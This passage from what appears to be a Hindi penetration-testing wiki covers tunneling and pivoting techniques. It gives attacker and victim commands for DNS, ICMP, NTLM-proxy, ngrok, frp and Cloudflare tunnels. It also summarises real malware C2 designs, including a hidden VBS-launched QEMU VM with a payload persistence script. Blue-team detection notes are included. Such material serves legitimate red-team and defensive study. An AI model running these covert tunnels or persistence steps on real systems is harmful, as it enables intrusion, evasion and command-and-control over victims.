अब हम **`mstsc.exe`** का उपयोग करके **RDP** के ज़रिए **victim** से **connect** कर सकते हैं, और हमें एक **prompt** मिलना चाहिए जिसमें बताया जाए कि **SocksOverRDP plugin enabled** है और यह **127.0.0.1:1080** पर **listen** करेगा।

**RDP** के ज़रिए **Connect** करें और victim machine पर `SocksOverRDP-Server.exe` binary को upload & execute करें:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

अब अपनी मशीन (attacker) पर पुष्टि करें कि पोर्ट 1080 listening है:

```
netstat -antb | findstr 1080
```

अब आप उस port के माध्यम से traffic को proxy करने के लिए [**Proxifier**](https://www.proxifier.com/) का उपयोग कर सकते हैं।<sup>[[26]](#references)</sup>

### RDP वर्चुअल-चैनल हंटिंग

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) एक अन्य RDP वर्चुअल-चैनल tunnel है; इसका default channel name `rdp2tcp` है, हालाँकि operator कोई दूसरा नाम चुन सकता है।<sup>[[56]](#references)</sup> Channel बनाने और बंद करने की घटनाएँ `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` में event IDs **132** और **148** के रूप में दर्ज होती हैं। `rdp2tcp` और असामान्य/रैंडम channel names को खोजें, फिर उनकी तुलना अपेक्षित channels जैसे `XPSRD`, `cliprdr`, और `Microsoft::Windows::RDS::DisplayControl` से करें।<sup>[[58]](#references)</sup>

## Windows GUI Apps को Proxify करें

आप [**Proxifier**](https://www.proxifier.com/) का उपयोग करके Windows GUI apps को proxy के माध्यम से navigate करा सकते हैं।<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** में SOCKS server का IP और port जोड़ें।\
**Profile -> Proxification Rules** में उस program का नाम जोड़ें जिसे proxify करना है, और उन IPs के connections जोड़ें जिन्हें आप proxify करना चाहते हैं; Proxifier rules applications, target hosts और ports से match कर सकते हैं।<sup>[[27]](#references)</sup>

## NTLM proxy के माध्यम से tunnel करें

पहले बताए गए tool **Rpivot** के ज़रिए NTLM-authenticating proxy से relay किया जा सकता है। **OpenVPN** को भी auth file और NTLMv2 method के साथ configure करने पर उसके माध्यम से traffic route किया जा सकता है; यह proxy traversal है, proxy authentication को bypass करना नहीं।<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm upstream NTLM proxies पर authenticate करता है, local listeners उपलब्ध कराता है, और local tunnel port को किसी destination service से map कर सकता है; इसके बाद clients उस local port का उपयोग कर सकते हैं।<sup>[[29]](#references)</sup>\
उदाहरण के लिए, port 443 को forward करें.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

अब, यदि आप उदाहरण के लिए victim में **SSH** service को port 443 पर listen करने के लिए सेट करते हैं, तो आप attacker के port 2222 के ज़रिए उससे connect कर सकते हैं।<sup>[[29]](#references)</sup>\
आप **meterpreter** का भी उपयोग कर सकते हैं, जो localhost:443 से connect करता है, जबकि attacker port 2222 पर listen करता है।<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) Microsoft का .NET reverse-proxy toolkit है। आप इसे यहाँ पा सकते हैं: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)।<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine DNS queries के ज़रिए एक IPv4 tunnel बनाता है और TUN interfaces का उपयोग करता है; दस्तावेज़ में दिया गया setup दोनों सिरों पर उन interfaces को बनाने के लिए आवश्यक privileges की मांग करता है।<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS transport में direct TCP की तुलना में अधिक overhead होता है और यह आमतौर पर धीमा होता है; आप इसका उपयोग करके इस tunnel के ज़रिए compressed SSH connection बना सकते हैं:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**इसे यहाँ से डाउनलोड करें**](https://github.com/iagox86/dnscat2)**.**

Dnscat2, DNS के ज़रिए एक encrypted command-and-control channel स्थापित करता है; नीचे दिए गए server और client commands इसके दस्तावेज़ित उपयोग के अनुसार हैं।<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **PowerShell में**

आप PowerShell में dnscat2 client चलाने के लिए [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) का उपयोग कर सकते हैं; इसका README नीचे दिखाए गए `Start-Dnscat2` parameters का दस्तावेज़ देता है।<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **dnscat के साथ Port forwarding**

dnscat2 का interactive `listen` command एक local listener को remote host और port से मैप करता है।<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### proxychains DNS बदलना

Proxychains-ng dynamically linked TCP connections को hook करता है और UDP या ICMP को carry नहीं कर सकता; DNS proxying को configure किया जा सकता है, इसलिए किसी तय public resolver को मान लेने के बजाय इंस्टॉल किए गए `proxychains.conf` और resolver helper की जाँच करें। Legacy `proxyresolv` scripts में resolver चुनने के लिए `PROXY_DNS_SERVER` उपलब्ध होता है; जब internal names की ज़रूरत हो, तो pivot से reachable resolver का उपयोग करें।<sup>[[34]](#references)[[35]](#references)</sup>

## Go में Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor ने एक **dual-channel C2 ("AK47C2")** बनाया, जो *केवल* outbound **DNS** और **plain HTTP POST** traffic का दुरुपयोग करता है—ये ऐसे दो protocols हैं जिन्हें corporate networks पर शायद ही कभी block किया जाता है।<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
   • एक random 5-character SessionID बनाता है (जैसे `H4T14`)।  
   • *task requests* के लिए `1` या *results* के लिए `2` जोड़ता है और अलग-अलग fields (flags, SessionID, computer name) को concatenate करता है।  
   • हर field को ASCII key `VHBD@H` से **XOR-encrypt** किया जाता है, hex-encode किया जाता है और dots से जोड़ा जाता है—और अंत में attacker-controlled domain जोड़ा जाता है:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Requests, **TXT** (और fallback **MG**) records के लिए `DnsQuery()` का उपयोग करते हैं।  
   • जब response 0xFF bytes से बड़ा होता है, तो backdoor data को 63-byte के हिस्सों में **fragments** करता है और ये markers जोड़ता है:
     `s<SessionID>t<TOTAL>p<POS>` ताकि C2 server उन्हें सही क्रम में लगा सके।

2. **HTTP mode (AK47HTTP)**
   • एक JSON envelope बनाता है:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • पूरा blob XOR-`VHBD@H` → hex किया जाता है → और `Content-Type: text/plain` header के साथ **`POST /`** के body के रूप में भेजा जाता है।
   • जवाब में भी यही encoding होती है और `cmd` field को `cmd.exe /c <command> 2>&1` के साथ execute किया जाता है।

Blue Team नोट्स
• ऐसे असामान्य **TXT queries** पर नज़र रखें जिनका पहला label लंबा hexadecimal हो और जो हमेशा एक दुर्लभ domain पर खत्म होता हो।  
• ASCII-hex के बाद constant XOR key को YARA से आसानी से detect किया जा सकता है: `6?56484244?484` (`VHBD@H` in hex)।  
• HTTP के लिए, ऐसे text/plain POST bodies को flag करें जो पूरी तरह hex हों और जिनकी लंबाई दो bytes का गुणज हो।

{{#note}}
यह channel हर sub-domain label को 63-octet DNS सीमा के भीतर रखता है, लेकिन केवल protocol compliance से यह stealthy नहीं हो जाता; दुर्लभ domains, लंबे hexadecimal labels और query volume अब भी detection signals हैं।<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans, TUN device और ICMP echo requests का उपयोग करके IPv4-over-ICMP tunnel का दस्तावेज़ देता है; setup के लिए interface बनाने हेतु पर्याप्त privileges की आवश्यकता होती है।<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**इसे यहाँ से डाउनलोड करें**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng, ICMP के ज़रिए TCP connections को transport करता है और नीचे दिखाए गए `-p`, `-l`, `-r`, और `-R` options का उपयोग क्रमशः proxy, local listener, destination host, और destination port के लिए करता है।<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) एक agent है, जो secure tunnel के ज़रिए local network services को online उपलब्ध कराता है; इसका CLI HTTP, TCP और file URL endpoints को document करता है, और प्रिंट किया गया endpoint hostname, endpoint और account के अनुसार अलग-अलग हो सकता है।<sup>[[39]](#references)</sup>

### Installation

- Account बनाएँ: https://ngrok.com/signup
- Client download:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### मूल उपयोग

**दस्तावेज़ीकरण:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_ज़रूरत पड़ने पर agent authentication और TLS विकल्पों को भी सपोर्ट करता है।<sup>[[39]](#references)</sup>_

#### TCP Tunneling

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### HTTP के माध्यम से फ़ाइलें उपलब्ध कराना

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### HTTP calls Sniffing

_XSS,SSRF,SSTI के लिए उपयोगी ..._\
Standalone agent डिफ़ॉल्ट रूप से अपना HTTP inspection interface `http://127.0.0.1:4040` पर उपलब्ध कराता है; यह interface HTTP traffic के लिए है।<sup>[[40]](#references)</sup>

#### Internal HTTP service Tunneling

`--host-header=rewrite` option upstream HTTP `Host` header को local service से मेल खाने के लिए rewrite करता है।<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml का सरल कॉन्फ़िगरेशन उदाहरण

यह ngrok Agent Config v2 का उपयोग करता है; named tunnels में `proto` और `addr` का उपयोग होता है और इन्हें `ngrok start` से शुरू किया जाता है।<sup>[[42]](#references)</sup> यह 3 tunnels खोलता है:

- 2 TCP
- `/tmp/httpbin/` से static files दिखाने वाला 1 HTTP tunnel

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels स्थानीय TCP-backed service को Microsoft relay infrastructure के ज़रिए publish कर सकते हैं। Host CLI एक outbound tunnel बनाता है, जबकि `devtunnel connect` client पर hosted port को फिर से उपलब्ध कराता है; जब तक access controls को जानबूझकर ढीला न किया जाए, tunnels के लिए default रूप से authentication आवश्यक होता है।<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

यह perimeter पर नया inbound listener खोले बिना `*.devtunnels.ms` के ज़रिए RDP को expose कर सकता है। इसे `rdp2tcp` जैसे RDP virtual-channel tunnel के साथ भी जोड़ा जा सकता है, जिससे RDP session मनमाने TCP traffic के लिए second-stage pivot बन जाता है।<sup>[[58]](#references)</sup>

Hunting के लिए, Dev Tunnels CLI के execution को `*.devtunnels.ms` पर DNS/TLS traffic और अप्रत्याशित RDP virtual-channel events के साथ correlate करें। केवल Microsoft-owned relay का उपयोग करने से authenticated tunnel benign नहीं हो जाता।<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel का `cloudflared` connector outbound connections स्थापित करता है; प्रकाशित applications HTTP, HTTPS, TCP, SSH और RDP को route कर सकते हैं, जबकि quick tunnels का उद्देश्य HTTP development है।<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel का one-liner

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 origin (legacy mode)

legacy `--socks5` flag `cloudflared` को बताता है कि local origin SOCKS5 बोलता है; यह local SOCKS5 listener नहीं बनाता। managed tunnel के लिए, `originRequest.proxyType: socks` SOCKS5 origin handling configure करता है।<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### DNS के साथ स्थायी tunnels

स्थानीय रूप से प्रबंधित tunnel configuration में नीचे दिखाए गए lower-case `tunnel`, `credentials-file`, और `url` keys का उपयोग किया जाता है।<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

कनेक्टर शुरू करें:

```bash
cloudflared tunnel run mytunnel
```

Connector outbound connections स्थापित करता है और, default रूप से, HTTP/2 पर fallback के साथ QUIC negotiate करता है; यह न मानें कि हर deployment TCP/443 का उपयोग करता है। इसे केवल उन privileges के साथ चलाएँ जिनकी आपके deployment को आवश्यकता है।<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) एक Go reverse proxy है, जो **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX और XTCP** को support करता है। XTCP P2P hole punching का उपयोग करता है, जिसकी सफलता NAT पर निर्भर करती है। **v0.53.0** से यह **SSH Tunnel Gateway** के रूप में काम कर सकता है, इसलिए target host `frpc` binary के बिना stock OpenSSH client का उपयोग कर सकता है।<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### नए SSH gateway का उपयोग (कोई frpc binary नहीं)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

ऊपर दिया गया कमांड stock OpenSSH client का उपयोग करके victim का port **8080**, **attacker_ip:9000** के रूप में प्रकाशित करता है, जबकि `frps` gateway प्रदान करता है।<sup>[[50]](#references)</sup>

## STUN-सहायता प्राप्त UDP back-connects

UDP socket से भेजे गए STUN Binding requests उसका server-reflexive IP address और port बता सकते हैं, जबकि नियमित traffic NAT binding को सक्रिय रखता है। सार्वजनिक STUN server, मनमाने control packets के लिए relay नहीं होता।<sup>[[60]](#references)</sup> विश्लेषण किए गए back-connect design में एक छोटे control datagram के लिए उसी UDP socket का उपयोग किया गया, फिर trigger मिलने के बाद commands प्राप्त करने और execute करने के लिए *अलग outbound TCP connection* का उपयोग किया गया।<sup>[[59]](#references)</sup>

Controller का UDP packet प्राप्त करने के लिए, design को अब भी उस controller के साथ mapping साझा करनी होगी और NAT की filtering policy को पूरा करना होगा। Address- या port-dependent filtering, STUN server से आने वाले replies स्वीकार कर सकती है, लेकिन किसी अन्य endpoint से आने वाले packets को drop कर सकती है।<sup>[[60]](#references)[[61]](#references)</sup> विश्लेषण किए गए backdoor का rendezvous path सत्यापित नहीं किया गया था, इसलिए केवल STUN replies का सफलतापूर्वक मिलना यह साबित नहीं करता कि उसका control channel पहुंच योग्य है।<sup>[[59]](#references)</sup> स्पष्ट rendezvous और relay fallback वाले एक अलग protocol के लिए, देखें [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport)।

## QEMU के साथ Covert VM-आधारित Tunnels

QEMU user-mode networking के लिए virtual network पर root या administrator privilege की आवश्यकता नहीं होती, और `-netdev user,hostfwd=...` host से guest तक TCP, UDP या UNIX connections को redirect करता है।<sup>[[51]](#references)</sup> TrustedSec ने एक ऐसे incident में Tiny Core QEMU VM और reverse SSH tunnel के प्रयास का दस्तावेजीकरण किया, जिसमें host पर केंद्रित EDR guest के अंदर की गतिविधि को पहचानने में चूक सकता था।<sup>[[1]](#references)</sup>

### तुरंत इस्तेमाल होने वाला one-liner

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• ऊपर दिया गया command **Tiny Core Linux** guest को 256 MiB guest memory और qcow2 disk image के साथ लॉन्च करता है; disk image RAM में मौजूद disk नहीं है।
• Windows host का port **2222/tcp** transparently guest के अंदर **22/tcp** पर forward किया जाता है।
• Attacker के नज़रिए से target केवल port 2222 expose करता है; वहाँ पहुँचने वाले सभी packets VM में चल रहे SSH server द्वारा handle किए जाते हैं।

### VBScript के ज़रिए stealthily लॉन्च करना

TrustedSec ने ऊपर दिए गए incident में VBS-driven QEMU launches और Tiny Core images देखे।<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

`cscript.exe //B update.vbs` के साथ script चलाने पर window छिपी रहती है।<sup>[[1]](#references)</sup>

### Guest के अंदर persistence

उद्धृत घटना में stateless Tiny Core guest में `/opt/bootlocal.sh` और `/opt/filetool.lst` के ज़रिए persistence का वर्णन है:<sup>[[1]](#references)</sup>

1. Payload को `/opt/123.out` में रखें  
2. `/opt/bootlocal.sh` में जोड़ें:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. shutdown के समय payload को `mydata.tgz` में पैक करने के लिए `/opt/filetool.lst` में `home/tc` और `opt` जोड़ें।

### Telemetry संबंधी विचार

• होस्ट पर QEMU process, qcow2 image और होस्ट द्वारा forward किया गया कोई भी listener अब भी दिखाई देता है।  
• केवल होस्ट पर चलने वाले process scans, guest processes की जाँच शायद न करें, लेकिन virtualization से बच निकलने की गारंटी नहीं होती; network, QEMU और image telemetry अब भी इसका खुलासा कर सकती हैं।<sup>[[1]](#references)[[51]](#references)</sup>

### Defender के लिए सुझाव

• user-writable paths में **अप्रत्याशित QEMU/VirtualBox/KVM binaries** मिलने पर alert करें।  
• `qemu-system*.exe` से शुरू होने वाले outbound connections को block करें।  
• QEMU launch होने के तुरंत बाद bind होने वाले दुर्लभ listening ports (2222, 10022, …) की तलाश करें।

## `HttpAddUrl` के ज़रिए IIS/HTTP.sys relay nodes (ShadowPad)

Check Point के अनुसार, ShadowPad का IIS module `HttpAddUrl` के ज़रिए URL prefixes को bind करके, compromised perimeter web servers को backdoor और relay nodes में बदल देता है।<sup>[[3]](#references)</sup>

इसी report में defaults, wildcard listeners, packet decryption, relay queues और debug telemetry का विवरण है, जिसका सारांश नीचे दिया गया है।<sup>[[3]](#references)</sup>

* **Config defaults** – अगर module की JSON config में values न हों, तो यह विश्वसनीय IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`) पर fallback करता है। इससे benign traffic का जवाब IIS सही branding के साथ देता है।
* **Wildcard interception** – operators URL prefixes की semicolon-separated list देते हैं (host और path में wildcards के साथ)। Module हर entry के लिए `HttpAddUrl` call करता है, जिससे HTTP.sys matching requests को malicious handler पर route करता है; nonmatching requests सामान्य IIS behavior पर fallback करती हैं।
* **Encrypted first packet** – request body के पहले दो bytes में custom 32-bit PRNG का seed होता है। Protocol parsing से पहले, इसके बाद आने वाले हर byte को generated keystream के साथ XOR किया जाता है:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay orchestration** – यह module दो सूचियाँ बनाए रखता है: “servers” (upstream nodes) और “clients” (downstream implants)। यदि ~30 seconds तक heartbeat नहीं मिलता, तो entries हटा दी जाती हैं। जब दोनों सूचियाँ खाली न हों, तो यह पहले स्वस्थ server को पहले स्वस्थ client के साथ जोड़ता है और एक ओर का socket बंद होने तक उनके sockets के बीच bytes भेजता रहता है।
* **Debug telemetry** – वैकल्पिक logging में हर pairing के लिए source IP, destination IP और कुल forwarded bytes दर्ज होते हैं। Investigators ने इन सुरागों का उपयोग करके कई victims में फैले ShadowPad mesh का पुनर्निर्माण किया।

---

## जाँचने के लिए अन्य tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [छायाओं में छिपना: QEMU Virtualization के ज़रिए Covert Tunnels](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell से पहले: Storm-2603 के पिछले Ransomware Operations की पड़ताल](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragon के अंदर: Stealthy Offensive Operation के Relay Network और आंतरिक कामकाज का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Firewall/IDS प्रतिबंधों को बायपास करना](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Metasploit में Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - कार्यान्वयन और विनिर्देश](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel का अवलोकन](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel सेटअप](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: BOF-PE से CDN-Fronted Tailnet](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLI commands](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer और Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - ClingSTUN Linux Backdoor द्वारा Public STUN Infrastructure का दुरुपयोग](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - NAT के लिए Session Traversal Utilities (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Unicast UDP के लिए NAT Behavioral Requirements](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [Tailcat README](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Kothamine malware द्वारा Network Detection से बचने के लिए Tailscale के tailcat का उपयोग](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
